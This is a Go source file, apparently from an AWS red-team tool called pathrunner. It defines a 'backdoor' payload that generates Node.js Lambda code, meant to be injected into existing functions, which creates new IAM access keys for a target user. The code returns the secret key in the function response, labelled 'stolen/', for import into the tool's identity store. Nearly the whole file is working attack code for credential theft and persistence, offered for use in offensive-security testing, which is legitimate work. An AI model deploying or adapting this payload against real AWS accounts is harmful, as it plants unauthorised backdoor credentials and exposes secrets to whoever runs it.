// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// BackdoorCreateAccessKeyNodejsPayload creates new IAM access keys for a target IAM user.
// Node.js equivalent of backdoor/create-access-key — for use with UpdateFunctionCode modules
// targeting existing Node.js Lambda functions. Emits a PATHFINDER_IDENTITY_DATA block for
// automatic credential import into the pathrunner identity store.
type BackdoorCreateAccessKeyNodejsPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorCreateAccessKeyNodejsPayload{})
}

func (p *BackdoorCreateAccessKeyNodejsPayload) GetName() string {
	return "backdoor/create-access-key-nodejs"
}

func (p *BackdoorCreateAccessKeyNodejsPayload) GetDescription() string {
	return "Create new access keys for an existing IAM user (Node.js runtime, does not work on roles)"
}

func (p *BackdoorCreateAccessKeyNodejsPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguageNodeJS,
		payloads.TagTechniqueBackdoor,
		payloads.TagTransportResponse,
	}
}

func (p *BackdoorCreateAccessKeyNodejsPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user name or ARN to create access keys for (CreateAccessKey only works on IAM users)",
			Required:    true,
		},
	}
}

func (p *BackdoorCreateAccessKeyNodejsPayload) Validate(options map[string]string) error {
	target := options["TARGET_ARN"]
	if target == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/create-access-key-nodejs payload")
	}
	if strings.HasPrefix(target, "arn:") && strings.Contains(target, ":role/") {
		return fmt.Errorf("TARGET_ARN is a role ARN — CreateAccessKey only works on IAM users")
	}
	return nil
}

func (p *BackdoorCreateAccessKeyNodejsPayload) GenerateCode(options map[string]string) (string, error) {
	code := `'use strict';

// SDK v2/v3 compatibility shim — works across all Node.js Lambda runtimes
async function getIAMClient() {
  try {
    const { IAMClient } = require('@aws-sdk/client-iam');
    return { client: new IAMClient({}), version: 3 };
  } catch (_) {
    const AWS = require('aws-sdk');
    return { client: new AWS.IAM(), version: 2 };
  }
}

exports.handler = async (event, context) => {
  const target = process.env.TARGET_ARN || '';

  // Extract username from ARN if provided
  let username = target;
  if (target.startsWith('arn:')) {
    if (target.includes(':user/')) {
      username = target.split(':user/').pop();
    } else if (target.includes(':role/')) {
      return {
        statusCode: 400,
        body: JSON.stringify({ status: 'error', message: 'CreateAccessKey only works on IAM users, not roles', target }),
      };
    }
  }

  const { client, version } = await getIAMClient();

  try {
    let accessKey;
    if (version === 3) {
      const { CreateAccessKeyCommand } = require('@aws-sdk/client-iam');
      const resp = await client.send(new CreateAccessKeyCommand({ UserName: username }));
      accessKey = resp.AccessKey;
    } else {
      const resp = await client.createAccessKey({ UserName: username }).promise();
      accessKey = resp.AccessKey;
    }

    const identityData = [
      '--- PATHFINDER_IDENTITY_DATA ---',
      'NAME=stolen/' + username,
      'TYPE=keys',
      'ACCESS_KEY_ID=' + accessKey.AccessKeyId,
      'SECRET_ACCESS_KEY=' + accessKey.SecretAccessKey,
      'AUTO_SWITCH=false',
      '--- END_PATHFINDER_IDENTITY_DATA ---',
    ].join('\n');

    return {
      statusCode: 200,
      body: JSON.stringify({
        status: 'success',
        message: 'Created access key for ' + username,
        username,
        access_key_id: accessKey.AccessKeyId,
        identity_data: identityData,
      }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ status: 'error', message: 'Failed to create access key: ' + err.message, target: username }),
    };
  }
};
`
	return code, nil
}

// ReportSideEffects returns the created access key as a tracked resource for cleanup.
func (p *BackdoorCreateAccessKeyNodejsPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, _ := parsePrincipalARN(options["TARGET_ARN"])

	return []modules.CreatedResource{
		{
			Type:          "iam:access-key",
			Name:          fmt.Sprintf("access-key-for-%s", principalName),
			CleanupMethod: "iam:DeleteAccessKey",
			Metadata: map[string]string{
				"username": principalName,
			},
		},
	}
}

func (p *BackdoorCreateAccessKeyNodejsPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Create Access Key Results (Node.js) ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Access key created successfully!\n\n")
			if username, ok := parsedBody["username"].(string); ok {
				output.WriteString("Username: " + username + "\n")
			}
			if keyID, ok := parsedBody["access_key_id"].(string); ok {
				output.WriteString("Access Key ID: " + keyID + "\n")
			}
			if identityData, ok := parsedBody["identity_data"].(string); ok {
				output.WriteString("\n" + identityData + "\n")
			}
		} else {
			output.WriteString("Failed to create access key\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
